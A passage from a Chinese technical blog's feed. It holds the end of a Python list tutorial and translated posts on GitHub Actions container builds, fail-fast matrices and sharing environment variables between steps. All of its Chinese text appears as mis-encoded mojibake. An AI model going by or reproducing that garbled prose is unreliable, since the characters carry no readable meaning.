class="comment"># list_copy = list_org[:]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ï¼Œä¿®æ”¹å¤åˆ¶çš„åˆ—è¡¨ä¸ä¼šå½±å“åŸæ¥çš„åˆ—è¡¨</span></span><br><span class="line">list_copy.append(<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(list_copy)</span><br><span class="line"><span class="built_in">print</span>(list_org)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="literal">True</span>]</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="literal">True</span>]</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="literal">True</span>]</span><br><span class="line">[<span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;cherry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br></pre></td></tr></table></figure><h3><span id="die-dai">è¿­ä»£</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨forå¾ªç¯è¿­ä»£åˆ—è¡¨</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">banana</span><br><span class="line">cherry</span><br><span class="line">lemon</span><br></pre></td></tr></table></figure><h3><span id="jian-cha-yuan-su-shi-fou-cun-zai">æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;banana&quot;</span> <span class="keyword">in</span> list_1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h3><span id="qie-pian">åˆ‡ç‰‡</span></h3><p>å’Œå­—ç¬¦ä¸²ä¸€æ ·ï¼Œä½¿ç”¨å†’å·ï¼ˆ <code>:</code>ï¼‰è®¿é—®åˆ—è¡¨çš„å­éƒ¨åˆ†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># a[start:stop:step], é»˜è®¤æ­¥é•¿ä¸º 1</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">b = a[<span class="number">1</span>:<span class="number">3</span>] <span class="comment"># ä¸»è¯­ï¼Œæœ€åä¸€ä¸ªç´¢å¼•ä¸åŒ…æ‹¬</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[<span class="number">2</span>:] <span class="comment"># çŸ¥é“æœ€å</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">b = a[:<span class="number">3</span>] <span class="comment"># ä»ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a[<span class="number">0</span>:<span class="number">3</span>] = [<span class="number">0</span>] <span class="comment"># æ›¿æ¢å­éƒ¨åˆ†ï¼Œéœ€è¦å¯è¿­ä»£</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[::<span class="number">2</span>] <span class="comment"># ä»å¤´åˆ°ä¸ºæ¯éš”ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a = a[::-<span class="number">1</span>] <span class="comment"># ä½¿ç”¨è´Ÿæ­¥é•¿ç¿»è½¬åˆ—è¡¨</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = a[:] <span class="comment"># ä½¿ç”¨åˆ‡ç‰‡å¤åˆ¶å…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">[<span class="number">0</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br><span class="line">[<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>]</span><br><span class="line">[<span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><h3><span id="lie-biao-tui-dao">åˆ—è¡¨æ¨å¯¼</span></h3><p>ä¸€ç§ä»ç°æœ‰åˆ—è¡¨åˆ›å»ºæ–°åˆ—è¡¨çš„ç®€ä¾¿å¿«æ·æ–¹æ³•ã€‚</p><p>åˆ—è¡¨æ¨å¯¼æ–¹æ‹¬å·å†…åŒ…å«ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œåè·Ÿforè¯­å¥ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">b = [i * i <span class="keyword">for</span> i <span class="keyword">in</span> a] <span class="comment"># æ¯ä¸ªå…ƒç´ å¹³æ–¹</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>]</span><br></pre></td></tr></table></figure><p>åµŒå¥—åˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      01. List â€” Python è¿›é˜¶
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬5å¤©ï¼šåœ¨å®¹å™¨ä¸­æ„å»º</title>
    <link href="https://qiwihui.com/qiwihui-blog-88/"/>
    <id>https://qiwihui.com/qiwihui-blog-88/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©æˆ‘è®¨è®ºäº†å¦‚ä½• <a href="https://qiwihui.com/qiwihui-blog-87/">åœ¨GitHub Actionsè™šæ‹Ÿç¯å¢ƒä¸Šå®‰è£…å·¥å…·å’Œä¾èµ–é¡¹</a>ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä½ éœ€è¦æ›´å¤šæ§åˆ¶æƒæ€ä¹ˆåŠï¼Ÿ æˆ–è€…ï¼Œå¦‚æœä½ æ ¹æœ¬ä¸æƒ³åœ¨ Ubuntu ä¸Šè¿è¡Œï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ è¿™æ˜¯å®¹å™¨å‘å…‰çš„åœ°æ–¹ã€‚</p><p>é€šè¿‡åˆ›å»ºä¸€ä¸ªåŒ…å«æ‰€æœ‰éœ€è¦çš„å¼€å‘å·¥å…·ä»¥åŠé¡¹ç›®ä¾èµ–é¡¹çš„å®¹å™¨ï¼Œä½ ä¸å¿…æ“å¿ƒåœ¨å·¥ä½œæµè¿è¡Œå¼€å§‹æ—¶å°±å¯¹é‚£äº›è®¾ç½®å’Œå®‰è£…æ­¥éª¤è¿›è¡Œç®¡ç†ã€‚</p><p>æ­¤å¤–ï¼Œä½ è¿˜å°†è·å¾—åŸºäºå®¹å™¨çš„å¼€å‘çš„ä¼˜åŠ¿ï¼šä½ å¯ä»¥åœ¨ç”¨äºCIæ„å»ºçš„åŒä¸€ä¸ªå®¹å™¨ä¸­è¿›è¡Œæœ¬åœ°æ„å»ºï¼Œå› æ­¤ä½ å¯ä»¥é«˜åº¦è‡ªä¿¡åœ°ç¡®ä¿ GitHub Actions ä¸­çš„æ„å»ºä¸æ„å»ºæ—¶æ‰€çœ‹åˆ°çš„ä¸æœ¬åœ°åŒ¹é…ã€‚</p><p>è¯­æ³•éå¸¸ç®€å•æ˜äº†â”€â”€æˆ‘ä¸éœ€è¦è‡ªå·±è¿è¡Œä»»ä½• <code>docker pull</code> æˆ– <code>docker run</code> å‘½ä»¤ã€‚ GitHub Actions ä¸ºæˆ‘è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚è¦è·å–æºä»£ç å¹¶åœ¨ <code>nodeï¼šcurrent</code> å®¹å™¨ä¸­è¿è¡Œæµ‹è¯•ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><span id="more"></span><script src="https://gist.github.com/ethomson/d56f1804295ee1a4779a0d013ec4572b.js"></script><p>å½“æˆ‘è¿è¡Œæ­¤å·¥ä½œæµæ—¶ï¼ŒGitHub Actions å°†ä» DockerHub ä¸‹è½½æˆ‘æŒ‡å®šçš„å®¹å™¨ï¼Œå¯åŠ¨å®ƒï¼Œç„¶åç›´æ¥åœ¨è¯¥å®¹å™¨ä¸­æ‰§è¡Œæˆ‘æŒ‡å®šçš„è¿è¡Œæ­¥éª¤ã€‚</p><blockquote><p>è¯·æ³¨æ„ï¼Œåœ¨å®¹å™¨å†…è¿è¡Œæ—¶ï¼Œä»ç„¶éœ€è¦æŒ‡å®šè¿è¡Œå¯¹è±¡ã€‚è¿™æ˜¯å› ä¸º Linux å’Œ Windows éƒ½æ”¯æŒå®¹å™¨â”€â”€å› æ­¤ï¼Œå¦‚æœä½ è¦è¿è¡ŒåŸºäº Linux çš„å®¹å™¨ï¼Œåˆ™éœ€è¦ <code>runs-on: ubuntu-latest</code>ã€‚ å¦‚æœè¦ä½¿ç”¨åŸºäºWindowsçš„å®¹å™¨ï¼Œè¯·ç¡®ä¿è®¾ç½® <code>runs-on: windows-latest</code>ã€‚</p></blockquote><p>å®¹å™¨è¿˜å¯ä»¥å¸®åŠ©æ‰©å±•æ„å»ºçŸ©é˜µï¼šå¦‚æœè¦è·¨å¤šä¸ª Linux å‘è¡Œç‰ˆæ„å»ºå’Œæµ‹è¯•å·¥å…·ï¼Œåˆ™ç”šè‡³å¯ä»¥åœ¨çŸ©é˜µä¸­è®¾ç½®å®¹å™¨ä½œä¸šã€‚ï¼ˆå› ä¸º <a href="https://www.edwardthomson.com/blog/github_actions_2_matrixes.html">çŸ©é˜µå·¥ä½œæµå®é™…ä¸Šåªæ˜¯å¯å˜çš„æ›¿ä»£</a>ã€‚ï¼‰</p><p>ä¾‹å¦‚ï¼Œè¦åœ¨ Debianï¼ŒUbuntu å’Œ CentOS çš„æ—§ç‰ˆå’Œæœ€æ–°ç‰ˆæœ¬ä¸Šæ„å»ºï¼š</p><script src="https://gist.github.com/ethomson/46a2db40d5c1d320fcc79886320f375e.js"></script><p>å› æ­¤ï¼Œæ— è®ºä½ æ˜¯è¦ç›´æ¥åœ¨æˆ‘ä»¬æä¾›çš„è™šæ‹Ÿç¯å¢ƒä¸­è¿˜æ˜¯åœ¨ä½ æŒ‡å®šçš„å®¹å™¨ä¸­æ„å»ºï¼Œä½ éƒ½å¯ä»¥çµæ´»åœ°é€‰æ‹©å·¥ä½œæµçš„è¿è¡Œä½ç½®ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_5_building_in_containers.html">https://www.edwardthomson.com/blog/github_actions_5_building_in_containers.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬5å¤©ï¼šåœ¨å®¹å™¨ä¸­æ„å»º
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬6å¤©ï¼šå¿«é€Ÿå¤±è´¥çš„çŸ©é˜µå·¥ä½œæµ</title>
    <link href="https://qiwihui.com/qiwihui-blog-89/"/>
    <id>https://qiwihui.com/qiwihui-blog-89/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>å› æ­¤ï¼Œå…³äº GitHub Actions çš„è¿™äº›å¸–å­ç”šè‡³è¿˜ä¸åˆ°ä¸€å‘¨ï¼Œæˆ‘å·²ç»å†™äº†å¾ˆå¤šæœ‰å…³ <a href="https://qiwihui.com/qiwihui-blog-85/">çŸ©é˜µå·¥ä½œæµ</a> çš„æ–‡ç« ã€‚å¦‚ä½ è¿˜æ²¡çŒœåˆ°ï¼Œæˆ‘æ˜¯å¿ å®ç²‰ä¸ã€‚ ğŸ˜</p><p>ä½†æ˜¯ï¼Œå¦‚æœä½ å¼€å§‹è®¾ç½®ç¬¬ä¸€ä¸ªçŸ©é˜µå·¥ä½œæµç¨‹ï¼Œé‚£ä¹ˆä½ éœ€è¦æ³¨æ„ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒçŸ©é˜µå·¥ä½œæµç¨‹ä¼š<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#jobsjob_idstrategyfail-fast">å¿«é€Ÿå¤±è´¥</a>ã€‚è¿™å°±æ˜¯è¯´ï¼šå¦‚æœçŸ©é˜µæ‰©å±•ä¸­çš„ä¸€ä¸ªä½œä¸šå¤±è´¥ï¼Œåˆ™å…¶ä½™ä½œä¸šå°†è¢«å–æ¶ˆã€‚</p><p>è¿™ç§è¡Œä¸ºé€šå¸¸éå¸¸æœ‰ç›Šï¼šå¦‚æœä½ æ­£åœ¨è¿è¡Œ pull request éªŒè¯æ„å»ºï¼Œè€ŒçŸ©é˜µä¸­çš„æ„å»ºä¹‹ä¸€å¤±è´¥ï¼Œåˆ™ä½ å¯èƒ½æ ¹æœ¬ä¸åœ¨ä¹å…¶ä½™çš„æ„å»ºæ˜¯å¦æˆåŠŸã€‚ä»»ä½•å¤±è´¥éƒ½è¶³ä»¥è¡¨æ˜å­˜åœ¨ä½¿ä½ æ— æ³•åˆå¹¶ PR çš„é—®é¢˜ã€‚</p><span id="more"></span><p>ä½†æ˜¯ï¼Œå½“ä½ ä»å¤´å¼€å§‹åˆ›å»ºå·¥ä½œæµæ—¶ï¼Œå¯èƒ½éœ€è¦è¿­ä»£ä¸€ä¸‹æ‰èƒ½ä½¿å…¶ç¬¬ä¸€æ¬¡æ­£å¸¸å·¥ä½œã€‚å½“ä½œä¸šå¤±è´¥æ˜¯ç”±äºå·¥ä½œæµè®¾ç½®ä¸­å­˜åœ¨é—®é¢˜è€Œä¸æ˜¯ä»£ç æœ¬èº«å­˜åœ¨é—®é¢˜æ—¶ï¼Œå…³é—­å¿«é€Ÿæ•…éšœè¡Œä¸ºä½œä¸ºè°ƒè¯•å·¥å…·ä¼šå¾ˆæœ‰å¸®åŠ©ã€‚</p><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªåœ¨ Linux ä¸Šè¿è¡Œè‰¯å¥½çš„å·¥ä½œæµç¨‹ï¼Œå¹¶ä¸”å¸Œæœ›ä½¿ç”¨çŸ©é˜µå°†å…¶æ‰©å±•åˆ°å¯ä»¥åœ¨ macOS å’Œ Windows ä¸Šè¿è¡Œã€‚å¯¹äºç®€å•çš„å·¥ä½œæµç¨‹ï¼Œè¿™å¯èƒ½ä¼šæ­£å¸¸å·¥ä½œã€‚ä½†æ˜¯å¯¹äºæ›´å¤æ‚çš„äº‹æƒ…ï¼Œä½ å¯èƒ½éœ€è¦å…ˆè®¾ç½®ä¸€äº›ä¾èµ–é¡¹æˆ–å®‰è£…ä¸€äº›å·¥å…·ï¼Œç„¶åæ‰èƒ½èµ·ä½œç”¨ã€‚å› æ­¤ï¼Œå¾ˆå¯èƒ½ä½ çš„Linuxä¸Šè¿è¡Œçš„å·¥ä½œæµå¦‚æœä¸åšä¸€äº›ä¿®æ”¹å°±æ— æ³•åœ¨ macOS æˆ– Windows ä¸Šè¿è¡Œã€‚</p><p>é‚£ä¹ˆï¼Œå½“ä½ ç¬¬ä¸€æ¬¡è¿è¡Œæ­¤æ–°çŸ©é˜µå·¥ä½œæµæ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿä½ çš„ Linuxï¼ŒmacOS å’Œ Windows ä½œä¸šå°†å…¨éƒ¨å¯åŠ¨ï¼Œå¹¶ä¸” macOS ä½œä¸šæˆ– Windows ä½œä¸šå°†å¤±è´¥ï¼Œå…¶ä½™å·¥ä½œæµç¨‹å°†è¢«å–æ¶ˆã€‚</p><p>æƒ³è±¡ä¸€ä¸‹ï¼Œé¦–å…ˆå¤±è´¥çš„æ˜¯ Windows ä½œä¸šã€‚ä½ ä¼šçœ‹åˆ°çš„ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/77217607-b9693880-6b5e-11ea-91df-11d70a9388f1.png" alt="image"></p><p>å¥½çš„ï¼Œå› æ­¤ä½ å†³å®šéœ€è¦ä¿®å¤ Windows å·¥ä½œæµç¨‹ã€‚ å› æ­¤ï¼Œä½ å¯ä»¥æŸ¥çœ‹å‡ºäº†ä»€ä¹ˆé—®é¢˜ï¼Œæ›´æ–°å·¥ä½œæµç¨‹ï¼Œç„¶åæ¨é€æ›´æ”¹ä»¥å°†æ–°æ„å»ºæ”¾å…¥é˜Ÿåˆ—ã€‚ ä½†æ˜¯ï¼Œç”±äºæ’é˜Ÿå’Œè°ƒåº¦ä¸æ˜¯å¾ˆç¡®å®šï¼Œå› æ­¤ä¹Ÿè®¸è¿™æ¬¡ macOS æ„å»ºé¦–å…ˆå®Œæˆâ”€â”€å¤±è´¥ã€‚ ç°åœ¨ï¼Œä½ çš„ Windows è¿è¡Œè¢«å–æ¶ˆï¼Œç”šè‡³æ— æ³•æ‰¾å‡ºå®ƒæ˜¯å¦æœ‰æ•ˆï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/77217652-0220f180-6b5f-11ea-99bb-0bcf357f6db1.png" alt="image"></p><p>ç°åœ¨ï¼Œåœ¨è°ƒè¯•å·¥ä½œæµæ—¶ï¼Œå¯ä»¥é€šè¿‡è®¾ç½® <code>fail-fast: false</code> æ¥å…³é—­æ­¤è¡Œä¸ºï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">strategy:</span></span><br><span class="line">  <span class="attr">matrix:</span></span><br><span class="line">    <span class="attr">os:</span> [<span class="string">ubuntu-latest</span>, <span class="string">macos-latest</span>, <span class="string">windows-latest</span>]</span><br><span class="line">  <span class="attr">fail-fast:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œå·¥ä½œæµä¸ä¼šåœ¨ç¬¬ä¸€ä¸ªå¤±è´¥çš„ä½œä¸šæ—¶è¢«å–æ¶ˆã€‚å®ƒå°†å…è®¸ Windows å’Œ macOS ä½œä¸šè¿è¡Œå®Œæˆã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77217688-48765080-6b5f-11ea-9fad-063aecf682f5.png" alt="image"></p><p>å…³é—­ <code>fail-fast</code> å°†å¸®åŠ©ä½ æ›´è½»æ¾åœ°è¿­ä»£å·¥ä½œæµç¨‹ã€‚å‡†å¤‡å¥½åœ¨ç”Ÿäº§ä¸­è¿è¡Œæ—¶ï¼Œè¯·åŠ¡å¿…å°†å…¶é‡æ–°æ‰“å¼€ï¼è¿™å°†å¸®åŠ©ä½ èŠ‚çœCIè¿è¡Œæ—¶é—´ï¼ˆå’Œé‡‘é’±ï¼‰ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_6_fail_fast_matrix_workflows.html">https://www.edwardthomson.com/blog/github_actions_6_fail_fast_matrix_workflows.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬6å¤©ï¼šå¿«é€Ÿå¤±è´¥çš„çŸ©é˜µå·¥ä½œæµ
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬15å¤©ï¼šåœ¨æ­¥éª¤ä¹‹é—´å…±äº«æ•°æ®</title>
    <link href="https://qiwihui.com/qiwihui-blog-98/"/>
    <id>https://qiwihui.com/qiwihui-blog-98/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ GitHub Actions çš„ä»»åŠ¡ä¸­ï¼Œä½ å¯ä»¥æœ‰å¤šä¸ªæ­¥éª¤ ï¼Œä¸€ä¸ªæ¥ä¸€ä¸ªåœ°è¿è¡Œã€‚æ¯ä¸ªæ­¥éª¤å¯èƒ½æ˜¯è°ƒç”¨ä¸€ä¸ªæ“ä½œï¼ˆä¾‹å¦‚ï¼Œ<a href="https://github.com/actions/checkout">æ£€å‡ºå­˜å‚¨åº“ä¸­çš„ä»£ç </a>æˆ–<a href="https://github.com/actions/setup-node">å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„Node.js</a>ï¼‰ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ª <code>run</code>ï¼Œä»…è¿è¡Œä½ æä¾›çš„è„šæœ¬çš„æ­¥éª¤ã€‚</p><p>ä½†æ˜¯é€šå¸¸ä½ å¸Œæœ›ä¸ä¹‹å‰æ‰§è¡Œçš„æ­¥éª¤è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚ï¼Œä½ å¯èƒ½å¸Œæœ›è¿è¡Œä¸€ä¸ªæ­¥éª¤æ¥æ›´æ–°è½¯ä»¶çš„ç‰ˆæœ¬å·ï¼Œä»¥ä½¿å…¶å‡†å¤‡å¥½å‘å¸ƒã€‚ç„¶åï¼Œä½ å¯èƒ½éœ€è¦åœ¨å®é™…çš„å‘å¸ƒæ­¥éª¤ä¸­ä½¿ç”¨è¯¥ç‰ˆæœ¬å·ã€‚</p><span id="more"></span><p>ä½†æ˜¯ï¼Œå¦‚ä½•æ¥å›è·å–è¿™äº›æ•°æ®ï¼ŸGitHub Actionsåœ¨å…¶è‡ªå·±çš„æµç¨‹ä¸­è¿è¡Œä½ çš„æ¯ä¸ªæ­¥éª¤ã€‚è¿™æ„å‘³ç€ä½ ä¸èƒ½åªåœ¨ä¸€ä¸ªæ­¥éª¤ä¸­è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œç„¶ååœ¨å¦ä¸€æ­¥éª¤ä¸­å¼•ç”¨å®ƒã€‚æ¢å¥è¯è¯´ï¼Œè¿™å°†æ— æ³•æ­£å¸¸å·¥ä½œï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="comment"># è¿™å°† **æ— æ•ˆ**ã€‚è¿™ä¸¤ä¸ª `run` æ­¥éª¤è¢«ç¼–å†™ä¸º</span></span><br><span class="line">  <span class="comment"># ä½œä¸ºä¸åŒçš„è„šæœ¬å¹¶ç”±ä¸åŒçš„shellè¿è¡Œï¼Œå› æ­¤</span></span><br><span class="line">  <span class="comment"># `FOO` å˜é‡å°†ä¸ä¼šåœ¨å®ƒä»¬ä¹‹é—´æŒä¹…å­˜åœ¨ã€‚</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">export</span> <span class="string">FOO=bar</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">$FOO</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼ŒGitHub Actions ç¡®å®ä¸ºä½ æä¾›äº†å°†æ•°æ®æŒä¹…ä¿å­˜åœ¨æ‰§è¡Œç¯å¢ƒä¸­çš„å·¥å…·ã€‚ä½ å¯ä»¥é€šè¿‡å†™å…¥æ ‡å‡†è¾“å‡ºï¼ˆå³ï¼Œä»…ä½¿ç”¨echoï¼‰æ¥å‘GitHub Actionsç¼–å†™å‘½ä»¤â”€â”€åŒ…æ‹¬æŒ‡ç¤º GitHub Actions åœ¨åç»­è¿è¡Œæ­¥éª¤ä¸­<a href="https://github.com/actions/setup-node">è®¾ç½®ç¯å¢ƒå˜é‡çš„å‘½ä»¤</a>ã€‚</p><p>åœ¨å½“å‰shellä¸­è®¾ç½®ç¯å¢ƒå˜é‡ä¹‹åï¼Œå¯ä»¥å¯¹GitHub Actions ä½¿ç”¨å‘½ä»¤ <code>set-env</code> ï¼Œè¿™å°†æ˜¯ç¯å¢ƒå˜é‡è¢«æ³¨å…¥åˆ°ä»¥åçš„æ­¥éª¤ä¸­ï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">steps:</span></span><br><span class="line">  <span class="comment"># è¿™å°†ä¼šåœ¨ç¬¬ä¸€ä¸ª `run` è„šæœ¬ä¸­è®¾ç½® `FOO` ç¯å¢ƒå˜é‡ã€‚</span></span><br><span class="line">  <span class="comment"># ç„¶åæŒ‡ç¤º GitHub Actions åœ¨éšåçš„è¿è¡Œæ­¥éª¤ä¸­ä½¿å…¶å¯ç”¨ã€‚</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      export FOO=bar</span></span><br><span class="line"><span class="string">      echo &quot;::set-env name=FOO::$FOO&quot;</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">$FOO</span></span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œå®é™…ä¸Šå¯ä»¥åœ¨åç»­æ­¥éª¤ä¸­è·å–ç¯å¢ƒå˜é‡ <code>FOO</code> ä¸­çš„æ•°æ®ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77851728-322a5d80-720d-11ea-8a61-43a2b1c99549.png" alt="image"></p><p>GitHub Actionså°†è¿™äº›æ­¥éª¤ä½œä¸ºå•ç‹¬çš„è„šæœ¬è¿è¡Œâ”€â”€è¿™æ„å‘³ç€åœ¨å•ç‹¬çš„Shellè°ƒç”¨ä¸­è¿è¡Œå¹¶æ¯æ¬¡éƒ½è·å¾—åŸå§‹ç¯å¢ƒã€‚ä½†æ˜¯ï¼Œä½¿ç”¨GitHub Actionså¹³å°å†…çš„å¼€å‘å·¥å…·ï¼Œä½ å¯ä»¥åœ¨è°ƒç”¨ä¹‹é—´å…±äº«æ•°æ®ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_15_sharing_data_between_steps.html">https://www.edwardthomson.com/blog/github_actions_15_sharing_data_between_steps.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a 